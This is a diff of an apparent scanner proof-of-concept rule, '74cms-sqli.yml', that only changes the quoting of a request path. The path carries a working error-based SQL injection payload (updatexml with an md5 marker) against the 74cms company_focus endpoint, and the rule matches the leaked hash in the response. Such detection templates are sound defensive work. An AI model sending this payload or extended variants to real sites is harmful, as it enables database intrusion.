@@ -1,7 +1,7 @@
 name: 74cms-sqli.yml
 rules:
 	- method: GET
-	  path: "/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa%22)%20and%20updatexml(1,concat(0x7e,(select%20md5(123456)),0)%20--%20a"
+	  path: '/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa%22)%20and%20updatexml(1,concat(0x7e,(select%20md5(123456)),0)%20--%20a'
 	  expression: |
 	  	response.status != 200 && response.body.bcontains(b'e10adc3949ba59abbe56e057f20f883')
 
